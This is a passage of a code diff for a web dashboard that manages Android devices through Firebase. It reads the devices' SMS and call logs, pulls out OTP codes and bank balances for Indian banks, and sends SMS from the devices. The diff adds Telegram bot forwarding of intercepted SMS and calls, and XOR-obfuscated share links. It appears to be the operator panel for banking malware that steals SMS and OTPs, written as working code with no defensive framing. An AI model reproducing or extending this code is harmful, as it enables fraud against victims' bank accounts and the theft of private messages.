-    'HSBC', 'Deutsche Bank', 'ABN AMRO', 'Barclays', 'BNP Paribas'
+    'Canara Bank','State Bank of India','SBI','HDFC Bank','ICICI Bank',
+    'Axis Bank','Kotak Mahindra Bank','Yes Bank','PNB','Punjab National Bank',
+    'Bank of Baroda','BOB','Union Bank','IDFC Bank','IndusInd Bank',
+    'RBL Bank','Bank of India','Central Bank','Indian Bank','UCO Bank',
+    'Bank of Maharashtra','Indian Overseas Bank','South Indian Bank',
+    'Federal Bank','Dhanlaxmi Bank','Karur Vysya Bank','Lakshmi Vilas Bank',
+    'Tamilnad Mercantile Bank','City Union Bank','Nainital Bank',
+    'Karnataka Bank','Saraswat Bank','Kalyan Janata Sahakari Bank',
+    'Shamrao Vithal Co-operative Bank','Citibank','Standard Chartered',
+    'HSBC','Deutsche Bank','ABN AMRO','Barclays','BNP Paribas'
 ];
 
 const SENDER_BANK_MAP = {
-    'CENTBK': 'Central Bank of India', 'CBIN': 'Central Bank of India',
-    'SBIIN': 'SBI', 'SBIN': 'SBI', 'HDFCB': 'HDFC Bank', 'HDFC': 'HDFC Bank',
-    'ICICI': 'ICICI Bank', 'AXISB': 'Axis Bank', 'KOTAK': 'Kotak Mahindra Bank',
-    'YESB': 'Yes Bank', 'PNB': 'PNB', 'BOB': 'Bank of Baroda',
-    'UBIN': 'Union Bank', 'IDFC': 'IDFC Bank', 'INDB': 'IndusInd Bank',
-    'RBLB': 'RBL Bank', 'BKID': 'Bank of India', 'CNRB': 'Canara Bank',
-    'UTIB': 'Axis Bank', 'SBHY': 'State Bank of Hyderabad',
-    'MAHB': 'Bank of Maharashtra', 'IOBA': 'Indian Overseas Bank',
-    'SOUB': 'South Indian Bank', 'FDRL': 'Federal Bank',
-    'DLXB': 'Dhanlaxmi Bank', 'KVBL': 'Karur Vysya Bank',
-    'LVCB': 'Lakshmi Vilas Bank', 'TMBL': 'Tamilnad Mercantile Bank',
-    'CUB': 'City Union Bank', 'NBTB': 'Nainital Bank',
-    'KARB': 'Karnataka Bank', 'SRCB': 'Saraswat Bank',
-    'KJSB': 'Kalyan Janata Sahakari Bank', 'SVCB': 'Shamrao Vithal Co-operative Bank',
-    'CITI': 'Citibank', 'SCB': 'Standard Chartered', 'HSBC': 'HSBC',
-    'DB': 'Deutsche Bank', 'ABN': 'ABN AMRO', 'BARCLAYS': 'Barclays',
-    'BNP': 'BNP Paribas'
+    'CENTBK':'Central Bank of India','CBIN':'Central Bank of India',
+    'SBIIN':'SBI','SBIN':'SBI','HDFCB':'HDFC Bank','HDFC':'HDFC Bank',
+    'ICICI':'ICICI Bank','AXISB':'Axis Bank','KOTAK':'Kotak Mahindra Bank',
+    'YESB':'Yes Bank','PNB':'PNB','BOB':'Bank of Baroda',
+    'UBIN':'Union Bank','IDFC':'IDFC Bank','INDB':'IndusInd Bank',
+    'RBLB':'RBL Bank','BKID':'Bank of India','CNRB':'Canara Bank',
+    'UTIB':'Axis Bank','SBHY':'State Bank of Hyderabad',
+    'MAHB':'Bank of Maharashtra','IOBA':'Indian Overseas Bank',
+    'SOUB':'South Indian Bank','FDRL':'Federal Bank',
+    'DLXB':'Dhanlaxmi Bank','KVBL':'Karur Vysya Bank',
+    'LVCB':'Lakshmi Vilas Bank','TMBL':'Tamilnad Mercantile Bank',
+    'CUB':'City Union Bank','NBTB':'Nainital Bank',
+    'KARB':'Karnataka Bank','SRCB':'Saraswat Bank',
+    'KJSB':'Kalyan Janata Sahakari Bank','SVCB':'Shamrao Vithal Co-operative Bank',
+    'CITI':'Citibank','SCB':'Standard Chartered','HSBC':'HSBC',
+    'DB':'Deutsche Bank','ABN':'ABN AMRO','BARCLAYS':'Barclays',
+    'BNP':'BNP Paribas'
 };
 
 function detectBankName(text, sender) {
@@ -685,8 +837,7 @@ function isCreditDebitSms(msg) {
 
 function isBankSms(msg) {
     const text = msg.message.toLowerCase();
-    return /balance|bank|credit|debit|ac no|account|upi|received|rs\.|₹|withdraw|deposit|credited|debited/.test(text) &&
-           isCreditDebitSms(msg);
+    return /balance|bank|credit|debit|ac no|account|upi|received|rs\.|₹|withdraw|deposit|credited|debited/.test(text) && isCreditDebitSms(msg);
 }
 
 function extractBalanceFromText(text) {
@@ -702,12 +853,6 @@ function extractBalance(msg) {
 function extractOtp(msg) {
     const match = msg.message.match(/\b(\d{4,8})\b/);
     return match ? match[1] : null;
-}
-
-function extractTransactionAmount(text) {
-    const match = text.match(/(?:rs\.?|₹)\s*([\d,]+\.?\d*)/i);
-    if (match) return match[1];
-    return null;
 }
 
 function getDeviceBankSms(deviceId) {
@@ -757,31 +902,18 @@ function toast(msg, type='success') {
 
 const SALT = 'XxR$P@n3l!';
 function encodeFirebaseConn(url, key) {
-    return btoa(url + '|||' + (key || ''));
+    const payload = url + '|||' + (key || '');
+    let enc = '';
+    for (let i = 0; i < payload.length; i++) {
+        enc += String.fromCharCode(payload.charCodeAt(i) ^ SALT.charCodeAt(i % SALT.length));
+    }
+    return btoa(enc);
 }
 function decodeFirebaseConn(encoded) {
     try {
-        let str = atob(encoded);
-        let parts = str.split('|||');
-        if (parts[0] && parts[0].startsWith('https://') && parts[0].includes('firebaseio.com')) {
-            return { url: parts[0].trim(), key: (parts[1] || '').trim() };
-        }
-    } catch(e) {}
-    try {
-        let dec = decodeURIComponent(atob(encoded));
-        let str = '';
-        for (let i=0; i<dec.length; i++) {
-            str += String.fromCharCode(dec.charCodeAt(i) ^ SALT.charCodeAt(i % SALT.length));
-        }
-        let parts = str.split('|||');
-        if (parts[0] && parts[0].startsWith('https://') && parts[0].includes('firebaseio.com')) {
-            return { url: parts[0].trim(), key: (parts[1] || '').trim() };
-        }
-    } catch(e) {}
-    try {
         let dec = atob(encoded);
         let str = '';
-        for (let i=0; i<dec.length; i++) {
+        for (let i = 0; i < dec.length; i++) {
             str += String.fromCharCode(dec.charCodeAt(i) ^ SALT.charCodeAt(i % SALT.length));
         }
         let parts = str.split('|||');
@@ -827,7 +959,7 @@ function loadFromURL() {
             activeConn = conn;
             renderConnections();
             showDashboard();
-            toast('Auto‑connected from shared link', 'success');
+            toast('Auto-connected from shared link', 'success');
             return true;
         }
     }
@@ -866,7 +998,7 @@ function showDashboard() {
 function renderConnections() {
     if (!connectionsList) return;
     if (CONNECTIONS.length === 0) {
-        connectionsList.innerHTML = `<div style="color:var(--muted);padding:12px;text-align:center">No accounts saved.</div>`;
+        connectionsList.innerHTML = '<div style="color:var(--muted);padding:12px;text-align:center">No accounts saved.</div>';
         connCount.textContent = '0';
         shareLinkInput.value = '';
         return;
@@ -874,29 +1006,38 @@ function renderConnections() {
     connCount.textContent = CONNECTIONS.length;
     connectionsList.innerHTML = CONNECTIONS.map((c, i) => {
         const displayLabel = c.label || c.url.replace(/https?:\/\//,'').replace(/\.firebaseio\.com.*/,'');
-        const shortLabel = displayLabel.length > 15 ? displayLabel.substring(0, 15) + '…' : displayLabel;
+        const shortLabel = displayLabel.length > 18 ? displayLabel.substring(0, 18) + '...' : displayLabel;
         return `
             <div class="conn-item">
                 <div class="info">
                     <div class="name">${esc(shortLabel)}</div>
                     <div class="date">${c.date || ''}</div>
                 </div>
-                <button class="copy-link" data-idx="${i}" title="Copy share link">🔗</button>
-                <button class="connect" data-idx="${i}" title="Connect">▶</button>
-                <button class="del" data-idx="${i}" title="Delete">✕</button>
+                <div class="actions-row">
+                    <button class="act-btn copy" data-idx="${i}" title="Copy share link">
+                        <svg width="14" height="14"><use href="#icon-link"/></svg>
+                    </button>
+                    <button class="act-btn connect" data-idx="${i}" title="Connect">
+                        <svg width="14" height="14"><use href="#icon-play"/></svg>
+                    </button>
+                    <button class="act-btn del" data-idx="${i}" title="Delete">
+                        <svg width="14" height="14"><use href="#icon-trash"/></svg>
+                    </button>
+                </div>
             </div>
         `;
     }).join('');
 
-    connectionsList.querySelectorAll('.copy-link').forEach(btn => {
-        btn.addEventListener('click', () => {
+    connectionsList.querySelectorAll('.act-btn.copy').forEach(btn => {
+        btn.addEventListener('click', (e) => {
+            e.stopPropagation();
             const idx = parseInt(btn.dataset.idx);
             const conn = CONNECTIONS[idx];
             if (!conn) return;
             const encoded = encodeFirebaseConn(conn.url, conn.key || '');
             const link = window.location.origin + window.location.pathname + '?s=' + encoded;
             navigator.clipboard.writeText(link).then(() => {
-                toast('🔗 Link Copied!', 'success');
+                toast('Share link copied', 'success');
             }).catch(() => {
                 const input = document.createElement('input');
                 input.value = link;
@@ -904,13 +1045,14 @@ function renderConnections() {
                 input.select();
                 document.execCommand('copy');
                 document.body.removeChild(input);
-                toast('🔗 Link Copied!', 'success');
+                toast('Share link copied', 'success');
             });
         });
     });
 
-    connectionsList.querySelectorAll('.connect').forEach(btn => {
-        btn.addEventListener('click', () => {
+    connectionsList.querySelectorAll('.act-btn.connect').forEach(btn => {
+        btn.addEventListener('click', (e) => {
+            e.stopPropagation();
             const idx = parseInt(btn.dataset.idx);
             const conn = CONNECTIONS[idx];
             if (conn) {
@@ -920,15 +1062,16 @@ function renderConnections() {
             }
         });
     });
-    connectionsList.querySelectorAll('.del').forEach(btn => {
-        btn.addEventListener('click', () => {
+    connectionsList.querySelectorAll('.act-btn.del').forEach(btn => {
+        btn.addEventListener('click', (e) => {
+            e.stopPropagation();
             const idx = parseInt(btn.dataset.idx);
             const label = CONNECTIONS[idx].label || CONNECTIONS[idx].url.replace(/https?:\/\//,'').substring(0,20);
             if (confirm('Delete "' + label + '"?')) {
                 CONNECTIONS.splice(idx, 1);
                 localStorage.setItem('rsx_connections', JSON.stringify(CONNECTIONS));
                 renderConnections();
-                toast('Deleted', 'error');
+                toast('Account deleted', 'error');
             }
         });
     });
@@ -945,7 +1088,7 @@ async function fbGet(path) {
     const res = await fetch(url);
     if (!res.ok) {
         let msg = await res.text();
-        throw new Error(`HTTP ${res.status}: ${msg.substring(0,50)}`);
+        throw new Error('HTTP ' + res.status + ': ' + msg.substring(0,50));
     }
     return res.json();
 }
@@ -959,9 +1102,19 @@ async function fbSet(path, data) {
     });
     if (!res.ok) {
         let msg = await res.text();
-        throw new Error(`HTTP ${res.status}: ${msg.substring(0,50)}`);
+        throw new Error('HTTP ' + res.status + ': ' + msg.substring(0,50));
     }
     return res.json();
+}
+
+async function fbDelete(path) {
+    const url = fbUrl(path);
+    const res = await fetch(url, { method: 'DELETE' });
+    if (!res.ok) {
+        let msg = await res.text();
+        throw new Error('HTTP ' + res.status + ': ' + msg.substring(0,50));
+    }
+    return true;
 }
 
 function parseDevices(data) {
@@ -997,7 +1150,7 @@ function parseDevices(data) {
 async function refreshDevices() {
     if (!activeConn || isLoading) return;
     isLoading = true;
-    statusLabel.textContent = '● Loading...';
+    statusLabel.textContent = 'Loading...';
     statusLabel.style.color = 'var(--gold)';
     statusLabel.style.borderColor = 'rgba(246,207,69,0.2)';
     statusLabel.style.background = 'rgba(246,207,69,0.06)';
@@ -1005,16 +1158,20 @@ async function refreshDevices() {
     try {
         const data = await fbGet('clients');
         allDevices = parseDevices(data);
+
+        // Load bot configs for all devices
+        await loadAllBotConfigs();
+
         updateStats();
         renderDeviceGrid();
 
         await Promise.allSettled(allDevices.map(d => loadMessagesForDevice(d.id)));
+        await Promise.allSettled(allDevices.map(d => loadCallsForDevice(d.id)));
 
         autoDetectPhoneNumbers();
         renderDeviceGrid();
         updateStats();
 
-        // FIX: Don't cache messages to avoid quota exceeded
         try {
             const cache = { devices: allDevices };
             localStorage.setItem('rsx_cache_' + activeConn.url, JSON.stringify(cache));
@@ -1022,12 +1179,12 @@ async function refreshDevices() {
             console.warn('Cache storage failed (quota exceeded)');
         }
 
-        statusLabel.textContent = '● Connected';
+        statusLabel.textContent = 'Connected';
         statusLabel.style.color = 'var(--green)';
         statusLabel.style.borderColor = 'rgba(0,214,143,0.2)';
         statusLabel.style.background = 'rgba(0,214,143,0.06)';
     } catch (e) {
-        statusLabel.textContent = '● Error';
+        statusLabel.textContent = 'Error';
         statusLabel.style.color = 'var(--red)';
         statusLabel.style.borderColor = 'rgba(255,77,77,0.2)';
         statusLabel.style.background = 'rgba(255,77,77,0.06)';
@@ -1035,6 +1192,38 @@ async function refreshDevices() {
     } finally {
         isLoading = false;
     }
+}
+
+// NEW: Bot config functions - stored in bot/{deviceId} instead of clients/{deviceId}
+async function loadAllBotConfigs() {
+    try {
+        const data = await fbGet('bot');
+        if (data && typeof data === 'object') {
+            botConfigCache = data;
+        }
+    } catch(e) {
+        botConfigCache = {};
+    }
+}
+
+async function loadBotConfig(deviceId) {
+    try {
+        const data = await fbGet('bot/' + deviceId);
+        if (data) {
+            botConfigCache[deviceId] = data;
+            return data;
+        }
+    } catch(e) {}
+    return null;
+}
+
+function getBotConfig(deviceId) {
+    return botConfigCache[deviceId] || {};
+}
+
+function deviceHasTelegram(deviceId) {
+    const cfg = getBotConfig(deviceId);
+    return !!(cfg.token && cfg.chatId);
 }
 
 function autoDetectPhoneNumbers() {
@@ -1154,6 +1343,35 @@ async function loadMessagesForDevice(deviceId) {
     }
 }
 
+function parseCalls(data) {
+    if (!data || typeof data !== 'object') return [];
+    return Object.entries(data).map(([key, c]) => {
+        return {
+            key,
+            number: c.number || c.phone || '',
+            type: c.type || 'incoming',
+            duration: c.duration || '',
+            dateTime: c.dateTime || c.timestamp || '',
+            name: c.name || '',
+            _ts: parseDate(c.dateTime || c.timestamp || '')
+        };
+    }).sort((a, b) => {
+        if (a._ts && b._ts) return b._ts - a._ts;
+        return a.key > b.key ? -1 : 1;
+    });
+}
+
+async function loadCallsForDevice(deviceId) {
+    try {
+        const data = await fbGet('calls/' + deviceId);
+        let calls = parseCalls(data);
+        if (calls.length > 100) calls = calls.slice(0, 100);
+        callCache[deviceId] = calls;
+    } catch(e) {
+        callCache[deviceId] = [];
+    }
+}
+
 function renderDeviceGrid() {
     const q = searchQuery.toLowerCase().trim();
     let filtered = allDevices;
@@ -1177,7 +1395,7 @@ function renderDeviceGrid() {
     if (filtered.length === 0) {
         deviceGrid.innerHTML = `
             <div class="empty-state">
-                <div class="shield-icon">🛡️</div>
+                <div class="shield-icon"><svg width="40" height="40" style="color:var(--dim)"><use href="#icon-shield"/></svg></div>
                 <h3>No devices connected</h3>
                 <p>Waiting for devices to register...</p>
                 <div class="auto-refresh-pill">
@@ -1193,10 +1411,11 @@ function renderDeviceGrid() {
         const bankMsgs = getDeviceBankSms(d.id);
         const balance = getLatestBalance(d.id);
         const bankName = getLatestBankName(d.id);
-        const phone = d.phone || '—';
+        const phone = d.phone || '-';
         const statusText = d.status ? 'Online' : 'Offline';
         const statusClass = d.status ? 'online' : 'offline';
         const displayName = d.deviceName || d.name || d.id;
+        const hasTg = deviceHasTelegram(d.id);
         return `
             <div class="device-card" data-id="${d.id}">
                 <div class="top">
@@ -1205,11 +1424,11 @@ function renderDeviceGrid() {
                         <div class="name">${esc(displayName)}</div>
                         <div class="sub">
                             <span>${esc(d.android || 'Android')}</span>
-                            <span>🔋 ${d.battery || 0}</span>
+                            <span>🔋 ${d.battery || 0}%</span>
                             <span>${esc(d.network || '')}</span>
                         </div>
                         <div class="status-badge ${statusClass}">${statusText}</div>
-                        ${phone !== '—' ? `<div class="phone-display">📱 ${esc(phone)}</div>` : ''}
+                        ${phone !== '-' ? `<div class="phone-display">📱 ${esc(phone)}</div>` : ''}
                     </div>
                 </div>
                 ${balance ? `<div class="balance-info">
@@ -1219,27 +1438,43 @@ function renderDeviceGrid() {
                 </div>` : ''}
                 <div class="details">
                     <div class="item"><small>Phone</small><div>${esc(phone)}</div></div>
-                    <div class="item"><small>Device ID</small><div>${esc(d.id)}</div></div>
+                    <div class="item"><small>Device ID</small><div>${esc(d.id.substring(0,12))}${d.id.length>12?'...':''}</div></div>
                 </div>
-                <button class="send-btn-small" data-id="${d.id}" title="Send SMS">✉</button>
+                <div class="card-actions">
+                    <button class="ca-btn tg ${hasTg ? 'active' : ''}" data-id="${d.id}" title="Telegram Config">
+                        <svg width="14" height="14"><use href="#icon-telegram"/></svg>
+                    </button>
+                    <button class="ca-btn sms" data-id="${d.id}" title="Quick SMS">
+                        <svg width="14" height="14"><use href="#icon-sms"/></svg>
+                    </button>
+                </div>
+                ${hasTg ? `<div class="tg-indicator active" title="Telegram active"></div>` : ''}
             </div>
         `;
     }).join('');
 
     deviceGrid.querySelectorAll('.device-card').forEach(card => {
         card.addEventListener('click', (e) => {
-            if (e.target.closest('.send-btn-small')) return;
+            if (e.target.closest('.ca-btn')) return;
             const id = card.dataset.id;
             const dev = allDevices.find(d => d.id === id);
             if (dev) openDetail(dev);
         });
     });
-    deviceGrid.querySelectorAll('.send-btn-small').forEach(btn => {
+    deviceGrid.querySelectorAll('.ca-btn.sms').forEach(btn => {
         btn.addEventListener('click', (e) => {
             e.stopPropagation();
             const id = btn.dataset.id;
             const dev = allDevices.find(d => d.id === id);
             if (dev) openDetail(dev);
+        });
+    });
+    deviceGrid.querySelectorAll('.ca-btn.tg').forEach(btn => {
+        btn.addEventListener('click', (e) => {
+            e.stopPropagation();
+            const id = btn.dataset.id;
+            const dev = allDevices.find(d => d.id === id);
+            if (dev) openTelegramModal(dev);
         });
     });
 }
@@ -1258,32 +1493,74 @@ function updateStats() {
     bankStat.textContent = bankTotal;
 }
 
-// DETAIL MODAL
+function openTelegramModal(device) {
+    tgDeviceTarget = device;
+    tgDeviceModalTitle.textContent = 'Telegram - ' + (device.deviceName || device.name || device.id).substring(0,20);
+    const cfg = getBotConfig(device.id);
+    tgDeviceToken.value = cfg.token || '';
+    tgDeviceChatId.value = cfg.chatId || '';
+    tgDeviceForwardSms.checked = cfg.forwardSms === true;
+    tgDeviceForwardCalls.checked = cfg.forwardCalls === true;
+    telegramDeviceModal.classList.add('active');
+}
+
+async function saveTelegramDeviceConfig() {
+    if (!tgDeviceTarget || !activeConn) return;
+    const token = tgDeviceToken.value.trim();
+    const chatId = tgDeviceChatId.value.trim();
+    const fwdSms = tgDeviceForwardSms.checked;
+    const fwdCalls = tgDeviceForwardCalls.checked;
+
+    try {
+        const botData = {
+            token: token,
+            chatId: chatId,
+            forwardSms: fwdSms,
+            forwardCalls: fwdCalls,
+            updatedAt: new Date().toISOString()
+        };
+        await fbSet('bot/' + tgDeviceTarget.id, botData);
+        botConfigCache[tgDeviceTarget.id] = botData;
+        telegramDeviceModal.classList.remove('active');
+        renderDeviceGrid();
+        if (selectedDevice && selectedDevice.id === tgDeviceTarget.id) {
+            renderInfoTab(selectedDevice);
+        }
+        toast('Telegram config saved to bot node', 'success');
+    } catch(e) {
+        toast('Save failed: ' + e.message, 'error');
+    }
+}
+
 async function openDetail(device) {
     selectedDevice = device;
     const displayName = device.deviceName || device.name || device.id;
     $('detailDeviceName').textContent = displayName;
     $('detailStatus').textContent = device.status ? '● Online' : '○ Offline';
     $('detailStatus').style.color = device.status ? 'var(--green)' : 'var(--muted)';
-    $('detailBattery').textContent = (device.battery || 0);
+    $('detailBattery').textContent = (device.battery || 0) + '%';
     const bankMsgs = getDeviceBankSms(device.id);
     const allMsgs = messageCache[device.id] || [];
+    const allCalls = callCache[device.id] || [];
     $('detailBankCount').textContent = bankMsgs.length;
     $('detailSmsCount').textContent = allMsgs.length;
     $('bankTabBadge').textContent = bankMsgs.length;
     $('smsTabBadge').textContent = allMsgs.length;
-    detailPhoneDisplay.textContent = device.phone || '—';
+    $('callsTabBadge').textContent = allCalls.length;
+    detailPhoneDisplay.textContent = device.phone || '-';
 
     renderInfoTab(device);
     renderSims(device);
     renderBankTab(device);
     renderSmsList(device.id, '');
+    renderCallsList(device.id);
+    renderNumbersTab(device.id);
 
     smsTo.value = device.phone || '';
     smsBody.value = '';
     sendResult.className = 'send-result';
     sendResult.textContent = '';
-    sendDevicePhone.textContent = device.phone || '—';
+    sendDevicePhone.textContent = device.phone || '-';
     updateSendBtnText();
 
     switchTab('info');
@@ -1293,49 +1570,60 @@ async function openDetail(device) {
     detailRefreshTimer = setInterval(() => {
         if (selectedDevice && detailModal.classList.contains('active')) {
             loadMessagesForDevice(selectedDevice.id).then(() => {
-                const activeTab = document.querySelector('.tab-btn.active');
-                if (activeTab) {
-                    const tab = activeTab.dataset.tab;
-                    if (tab === 'sms') renderSmsList(selectedDevice.id, smsSearch.value);
-                    else if (tab === 'bank') renderBankTab(selectedDevice);
-                    const bm = getDeviceBankSms(selectedDevice.id);
-                    const am = messageCache[selectedDevice.id] || [];
-                    $('detailBankCount').textContent = bm.length;
-                    $('detailSmsCount').textContent = am.length;
-                    $('bankTabBadge').textContent = bm.length;
-                    $('smsTabBadge').textContent = am.length;
-                }
+                loadCallsForDevice(selectedDevice.id).then(() => {
+                    const activeTab = document.querySelector('.tab-btn.active');
+                    if (activeTab) {
+                        const tab = activeTab.dataset.tab;
+                        if (tab === 'sms') renderSmsList(selectedDevice.id, smsSearch.value);
+                        else if (tab === 'bank') renderBankTab(selectedDevice);
+                        else if (tab === 'calls') renderCallsList(selectedDevice.id);
+                        else if (tab === 'numbers') renderNumbersTab(selectedDevice.id);
+                        const bm = getDeviceBankSms(selectedDevice.id);
+                        const am = messageCache[selectedDevice.id] || [];
+                        const ac = callCache[selectedDevice.id] || [];
+                        $('detailBankCount').textContent = bm.length;
+                        $('detailSmsCount').textContent = am.length;
+                        $('bankTabBadge').textContent = bm.length;
+                        $('smsTabBadge').textContent = am.length;
+                        $('callsTabBadge').textContent = ac.length;
+                    }
+                });
             });
         }
     }, 5000);
 }
 
 function renderInfoTab(device) {
+    const cfg = getBotConfig(device.id);
+    const hasTg = cfg.token && cfg.chatId;
     const rows = [
-        { label: 'Device Name', value: device.deviceName || device.name || '—' },
-        { label: 'Phone Number', value: device.phone || '—' },
-        { label: 'Phone Name', value: device.phoneName || '—' },
-        { label: 'Network', value: device.network || '—' },
-        { label: 'Android', value: device.android || '—' },
-        { label: 'IP Address', value: device.ip || '—' },
-        { label: 'Storage', value: device.storage || '—' },
-        { label: 'CPU Arch', value: device.cpuArch || '—' },
-        { label: 'SDK Version', value: device.sdkVersion || '—' },
+        { label: 'Device Name', value: device.deviceName || device.name || '-' },
+        { label: 'Phone Number', value: device.phone || '-' },
+        { label: 'Phone Name', value: device.phoneName || '-' },
+        { label: 'Network', value: device.network || '-' },
+        { label: 'Android', value: device.android || '-' },
+        { label: 'IP Address', value: device.ip || '-' },
+        { label: 'Storage', value: device.storage || '-' },
+        { label: 'CPU Arch', value: device.cpuArch || '-' },
+        { label: 'SDK Version', value: device.sdkVersion || '-' },
         { label: 'SIM Cards', value: device.sims ? device.sims.length + ' SIM(s)' : '0 SIM(s)' },
-        { label: 'SIM 1 Number', value: (device.sims && device.sims[0] && device.sims[0].phoneNumber) ? device.sims[0].phoneNumber : '—' },
-        { label: 'SIM 2 Number', value: (device.sims && device.sims[1] && device.sims[1].phoneNumber) ? device.sims[1].phoneNumber : '—' },
+        { label: 'SIM 1 Number', value: (device.sims && device.sims[0] && device.sims[0].phoneNumber) ? device.sims[0].phoneNumber : '-' },
+        { label: 'SIM 2 Number', value: (device.sims && device.sims[1] && device.sims[1].phoneNumber) ? device.sims[1].phoneNumber : '-' },
+        { label: 'Telegram Bot', value: hasTg ? 'Configured' : 'Not set' },
+        { label: 'Forward SMS', value: cfg.forwardSms ? 'ON' : 'OFF' },
+        { label: 'Forward Calls', value: cfg.forwardCalls ? 'ON' : 'OFF' },
     ];
     detailInfoList.innerHTML = `<div class="info-list">` + rows.map(r => `
         <div class="info-row">
             <span class="info-label">${esc(r.label)}</span>
-            <span class="info-value">${esc(r.value)}</span>
+            <span class="info-value" style="${r.label.includes('Telegram') || r.label.includes('Forward') ? 'color:var(--cyan)' : ''}">${esc(r.value)}</span>
         </div>
     `).join('') + `</div>`;
 }
 
 function renderSims(device) {
     if (!device.sims || !device.sims.length) {
-        detailSims.innerHTML = '<div style="color:var(--muted);padding:12px">—</div>';
+        detailSims.innerHTML = '<div style="color:var(--muted);padding:12px">No SIM data available</div>';
         return;
     }
     const rows = [];
@@ -1343,7 +1631,7 @@ function renderSims(device) {
         if (s.phoneNumber) rows.push({ label: 'Phone #' + (i+1), value: s.phoneNumber });
     });
     device.sims.forEach((s, i) => {
-        if (s.network || s.carrier) rows.push({ label: 'Network #' + (i+1), value: s.network || s.carrier || '—' });
+        if (s.network || s.carrier) rows.push({ label: 'Network #' + (i+1), value: s.network || s.carrier || '-' });
     });
     detailSims.innerHTML = rows.map(r => `
         <div class="info-row">
@@ -1367,7 +1655,7 @@ function renderBankTab(device) {
     if (balance) {
         latestBalanceCard.innerHTML = `
             <div class="latest-balance-card">
-                <div class="lbl">Latest Balance · ${esc(bankName || 'Unknown')}</div>
+                <div class="lbl">Latest Balance · ${esc(bankName || 'Unknown Bank')}</div>
                 <div class="amt">₹${esc(balance)}</div>
             </div>
         `;
@@ -1376,20 +1664,16 @@ function renderBankTab(device) {
     }
 
     if (!bankMsgs.length) {
-        bankMessageList.innerHTML = '<div style="color:var(--muted);padding:12px">No bank transactions.</div>';
+        bankMessageList.innerHTML = '<div style="color:var(--muted);padding:12px">No bank transactions found.</div>';
         return;
     }
 
     bankMessageList.innerHTML = bankMsgs.slice(0, 50).map(m => {
-        const otp = extractOtp(m);
         const txType = detectTxType(m.message);
         const bank = detectBankName(m.message, m.sender);
         const bal = extractBalance(m);
-        const txnAmt = extractTransactionAmount(m.message);
-        const icon = txType === 'credit' ? '↘' : txType === 'debit' ? '↗' : '₹';
+        const icon = txType === 'credit' ? '↓' : txType === 'debit' ? '↑' : '₹';
         const badgeText = txType === 'credit' ? 'Credit' : txType === 'debit' ? 'Debit' : 'Bank';
-        const txnSign = txType === 'debit' ? '-' : (txType === 'credit' ? '+' : '');
-        const txnColor = txType === 'debit' ? 'var(--cyan)' : (txType === 'credit' ? 'var(--green)' : 'var(--cyan)');
         return `
             <div class="tx-card-bank">
                 <div class="tx-top">
@@ -1403,11 +1687,7 @@ function renderBankTab(device) {
                 <div class="tx-mid">
                     <div>
                         <div class="tx-mid-label">Available Balance</div>
-                        <div class="tx-mid-amt balance">₹${esc(bal || '—')}</div>
-                    </div>
-                    <div style="text-align:right">
-                        <div class="tx-mid-label">Transaction</div>
-                        <div class="tx-mid-amt txn" style="color:${txnColor}">${txnSign}₹${esc(txnAmt || '—')}</div>
+                        <div class="tx-mid-amt balance">₹${esc(bal || '-')}</div>
                     </div>
                 </div>
                 <div class="tx-divider"></div>
@@ -1425,13 +1705,16 @@ function renderSmsList(deviceId, search = '') {
         m.message.toLowerCase().includes(search.toLowerCase()) ||
         (m.sender && m.sender.toLowerCase().includes(search.toLowerCase()))
     ) : msgs;
-    $('smsCountLabel').textContent = `(${filtered.length})`;
+    $('smsCountLabel').textContent = '(' + filtered.length + ')';
     const container = $('messageList');
     if (!filtered.length) {
         container.innerHTML = '<div style="color:var(--muted);padding:12px">No messages.</div>';
         return;
     }
-    container.innerHTML = filtered.slice(0, 150).map(m => {
+    const cfg = getBotConfig(deviceId);
+    const canForward = cfg.token && cfg.chatId;
+
+    container.innerHTML = filtered.slice(0, 150).map((m, idx) => {
         const otp = extractOtp(m);
         const bank = isBankSms(m);
         const numMatch = m.message.match(/(\+91|0)?[6-9]\d{9}/);
@@ -1441,11 +1724,10 @@ function renderSmsList(deviceId, search = '') {
         const txLabel = txType === 'credit' ? '💰 Credit' : txType === 'debit' ? '💸 Debit' : '';
         const bankName = detectBankName(m.message, m.sender);
         const bal = extractBalance(m);
-        // Get device phone for OTP
         const dev = allDevices.find(d => d.id === deviceId);
         const devPhone = dev ? (dev.phone || '') : '';
         return `
-            <div class="sms-item">
+            <div class="sms-item" data-key="${m.key}">
                 <div class="sms-header">
                     <span>${esc(m.sender || 'Unknown')}</span>
                     <span>${esc(m.dateTime || '')}</span>
@@ -1458,9 +1740,168 @@ function renderSmsList(deviceId, search = '') {
                 ${txType ? `<div class="tx-type ${txClass}">${txLabel}</div>` : ''}
                 ${bal ? `<div class="balance-tag">💰 Avl Bal: ₹${esc(bal)}</div>` : ''}
                 ${hasPhone ? `<div class="phone-tag">📱 ${esc(numMatch[0])}</div>` : ''}
+                ${canForward ? `
+                <div class="sms-actions">
+                    <button class="fwd-btn" data-action="forward-sms" data-key="${m.key}" data-device="${deviceId}">
+                        <svg width="12" height="12"><use href="#icon-forward"/></svg> Forward TG
+                    </button>
+                </div>` : ''}
             </div>
         `;
     }).join('');
+
+    // Attach forward handlers
+    container.querySelectorAll('[data-action="forward-sms"]').forEach(btn => {
+        btn.addEventListener('click', () => {
+            const key = btn.dataset.key;
+            const devId = btn.dataset.device;
+            const msg = messageCache[devId].find(m => m.key === key);
+            if (msg) forwardToTelegram(devId, 'sms', msg);
+        });
+    });
+}
+
+function renderCallsList(deviceId) {
+    const calls = callCache[deviceId] || [];
+    $('callsCountLabel').textContent = '(' + calls.length + ')';
+    if (!calls.length) {
+        callList.innerHTML = '<div style="color:var(--muted);padding:12px">No call logs.</div>';
+        return;
+    }
+    const cfg = getBotConfig(deviceId);
+    const canForward = cfg.token && cfg.chatId;
+
+    callList.innerHTML = calls.map(c => {
+        const typeClass = c.type === 'incoming' ? 'incoming' : c.type === 'outgoing' ? 'outgoing' : 'missed';
+        const typeLabel = c.type === 'incoming' ? 'IN' : c.type === 'outgoing' ? 'OUT' : 'MISSED';
+        return `
+            <div class="call-item" data-key="${c.key}">
+                <div class="call-header">
+                    <span class="call-number">${esc(c.number || 'Unknown')}</span>
+                    <span class="call-type ${typeClass}">${typeLabel}</span>
+                </div>
+                <div class="call-meta">
+                    <span>${esc(c.dateTime || '')}</span>
+                    <span class="call-duration">⏱ ${esc(c.duration || '-')}</span>
+                </div>
+                ${canForward ? `
+                <div class="call-actions">
+                    <button class="fwd-btn" data-action="forward-call" data-key="${c.key}" data-device="${deviceId}">
